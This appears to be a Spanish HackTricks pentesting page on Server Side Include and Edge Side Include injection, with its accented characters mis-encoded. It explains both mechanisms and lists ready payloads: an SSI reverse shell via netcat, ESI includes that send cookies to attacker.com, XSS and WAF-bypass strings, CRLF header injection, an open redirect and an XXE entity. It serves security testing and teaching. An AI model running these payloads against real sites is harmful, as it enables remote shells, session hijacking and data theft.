## Inyecci√≥n de Inclusi√≥n de Servidor/Inclusi√≥n de Borde de Servidor

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informaci√≥n B√°sica de Inclusi√≥n de Servidor

Los SSI (Server Side Includes) son directivas que se **colocan en p√°ginas HTML y se eval√∫an en el servidor** mientras se sirven las p√°ginas. Permiten **agregar contenido generado din√°micamente** a una p√°gina HTML existente, sin tener que servir toda la p√°gina a trav√©s de un programa CGI u otra tecnolog√≠a din√°mica.\
Por ejemplo, se puede colocar una directiva en una p√°gina HTML existente, como:

`<!--#echo var="DATE_LOCAL" -->`

Y, cuando se sirve la p√°gina, este fragmento se evaluar√° y se reemplazar√° por su valor:

`Martes, 15-Ene-2013 19:28:54 EST`

La decisi√≥n de cu√°ndo usar SSI y cu√°ndo tener su p√°gina generada completamente por alg√∫n programa es generalmente una cuesti√≥n de cu√°nto de la p√°gina es est√°tica y cu√°nto necesita ser recalculado cada vez que se sirve la p√°gina. SSI es una excelente manera de agregar peque√±as piezas de informaci√≥n, como la hora actual, que se muestra arriba. Pero si la mayor√≠a de su p√°gina se est√° generando en el momento en que se sirve, debe buscar otra soluci√≥n. (Definici√≥n tomada de [aqu√≠](https://httpd.apache.org/docs/current/howto/ssi.html)).

Se puede inferir la presencia de SSI si la aplicaci√≥n web utiliza archivos con las extensiones \*\* `.shtml`, `.shtm` o `.stm`\*\*, pero no es el √∫nico caso.

Una expresi√≥n SSI t√≠pica tiene el siguiente formato:
```
<!--#directive param="value" -->
```
### Verificaci√≥n
```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->

```
## Inclusi√≥n en el Lado del Borde

Existe un problema al **almacenar en cach√© informaci√≥n o aplicaciones din√°micas** ya que parte del contenido puede haber **variado** para la pr√≥xima vez que se recupere el contenido. Para esto se utiliza **ESI**, para indicar mediante etiquetas ESI el **contenido din√°mico que debe generarse** antes de enviar la versi√≥n en cach√©.\
Si un **atacante** es capaz de **inyectar una etiqueta ESI** dentro del contenido en cach√©, entonces podr√≠a ser capaz de **inyectar contenido arbitrario** en el documento antes de que se env√≠e a los usuarios.

### Detecci√≥n de ESI

El siguiente **encabezado** en una respuesta del servidor significa que el servidor est√° utilizando ESI:
```
Surrogate-Control: content="ESI/1.0"
```
Si no puedes encontrar esta cabecera, el servidor **podr√≠a estar usando ESI de todos modos**.\
Tambi√©n se puede utilizar un enfoque de explotaci√≥n ciega ya que una solicitud deber√≠a llegar al servidor del atacante:
```javascript
// Basic detection
hell<!--esi-->o 
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
### Explotaci√≥n de ESI

[GoSecure](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) ha creado una tabla para ayudarnos a entender los posibles ataques que podemos intentar contra diferentes software capaces de ESI, dependiendo de la funcionalidad admitida. Primero, proporcionemos algunas explicaciones sobre los nombres de columna de la tabla a continuaci√≥n:

* **Includes**: Admite la directiva `<esi:includes>`
* **Vars**: Admite la directiva `<esi:vars>`. √ötil para eludir los filtros XSS
* **Cookie**: Las cookies del documento son accesibles para el motor ESI
* **Upstream Headers Required**: Las aplicaciones de intermediario no procesar√°n las declaraciones ESI a menos que la aplicaci√≥n de origen proporcione las cabeceras
* **Host Allowlist**: En este caso, las inclusiones ESI solo son posibles desde los servidores de host permitidos, lo que hace que, por ejemplo, SSRF solo sea posible contra esos hosts

|         **Software**         | **Includes** | **Vars** | **Cookies** | **Upstream Headers Required** | **Host Whitelist** |
| :--------------------------: | :----------: | :------: | :---------: | :---------------------------: | :----------------: |
|            Squid3            |      S√≠      |    S√≠    |     S√≠      |              S√≠               |         No         |
|         Varnish Cache        |      S√≠      |    No    |      No     |              S√≠               |         S√≠         |
|            Fastly            |      S√≠      |    No    |      No     |              No               |         S√≠         |
| Akamai ESI Test Server (ETS) |      S√≠      |    S√≠    |     S√≠      |              No               |         No         |
|          NodeJS esi          |      S√≠      |    S√≠    |     S√≠      |              No               |         No         |
|         NodeJS nodesi        |      S√≠      |    No    |      No     |              No               |      Opcional      |

#### XSS

La siguiente directiva ESI cargar√° un archivo arbitrario dentro de la respuesta del servidor.
```markup
<esi:include src=http://attacker.com/xss.html>
```
El archivo _http://atacante.com/xss.html_ puede contener una carga √∫til XSS como `<script>alert(1)</script>`

#### Saltar la protecci√≥n XSS del cliente
```markup
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```
#### Robo de Cookie

* Robo remoto de cookie
```markup
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
* Robar la cookie HTTP\_ONLY con XSS reflej√°ndola en la respuesta:
```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->
```
<figure><img src="../.gitbook/assets/image (4) (7).png" alt=""><figcaption></figcaption></figure>

* Toma completa de la cuenta reflejando cookies

<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

#### Archivo local privado

No confundir con una "Inclusi√≥n de archivo local":
```markup
<esi:include src="secret.txt">
```
#### CRLF

CRLF significa Carriage Return Line Feed. Es un t√©rmino que se refiere a la secuencia de caracteres que se utilizan para representar el final de una l√≠nea de texto en un archivo. En algunos casos, los atacantes pueden aprovechar las vulnerabilidades de CRLF para inyectar c√≥digo malicioso en una aplicaci√≥n web.
```markup
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```
#### Redirecci√≥n Abierta

Lo siguiente agregar√° una cabecera `Location` a la respuesta.
```bash
<!--esi $add_header('Location','http://attacker.com') -->
```
#### Agregar Encabezado

* Agregar encabezado en solicitud forzada
```html
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```
* Agregar encabezado en la respuesta (√∫til para evitar "Content-Type: text/json" en una respuesta con XSS)
```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->
```
<figure><img src="../.gitbook/assets/image (5) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

#### CRLF en Agregar cabecera (**CVE-2019-2438)**
```markup
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
#### Depuraci√≥n de Akamai

Esto enviar√° informaci√≥n de depuraci√≥n incluida en la respuesta:
```markup
<esi:debug/>
```
### ESI + XSLT = XXE

Tambi√©n es posible agregar ESI basado en **Transformaciones de Lenguaje de Hojas de Estilo Extensible (XSLT)** mediante la especificaci√≥n del valor `xslt` al par√°metro _dca_. La siguiente inclusi√≥n har√° que el servidor HTTP solicite el archivo XML y XSLT. El archivo XSLT se utiliza para filtrar el archivo XML. Este archivo XML se puede utilizar para realizar ataques de _Entidades Externas XML (XXE)_. Esto permite a los atacantes realizar ataques SSRF, lo cual no es muy √∫til ya que esto debe realizarse a trav√©s de inclusiones ESI, que es un vector SSRF en s√≠ mismo. Las DTD externas no se analizan ya que la biblioteca subyacente (Xalan) no tiene soporte para ello. Esto significa que no podemos extraer archivos locales.
```markup
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
El archivo XSLT:
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
Revisa la p√°gina XSLT:

{% content-ref url="xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md](xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md)
{% endcontent-ref %}

### Referencias

* [https://www.gosecure.net/blog/2018/04/03/mas-alla-del-xss-inyeccion-de-inclusion-en-el-lado-del-servidor/](https://www.gosecure.net/blog/2018/04/03/mas-alla-del-xss-inyeccion-de-inclusion-en-el-lado-del-servidor/)
* [https://www.gosecure.net/blog/2019/05/02/inyeccion-de-esi-parte-2-abuso-de-implementaciones-especificas/](https://www.gosecure.net/blog/2019/05/02/inyeccion-de-esi-parte-2-abuso-de-implementaciones-especificas/)
* [https://academy.hackthebox.com/module/145/section/1304](https://academy.hackthebox.com/module/145/section/1304)
* [https://infosecwriteups.com/explorando-el-mundo-de-la-inyecci%C3%B3n-de-esi-b86234e66f91](https://infosecwriteups.com/explorando-el-mundo-de-la-inyecci%C3%B3n-de-esi-b86234e66f91)

## Lista de detecci√≥n de fuerza bruta

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
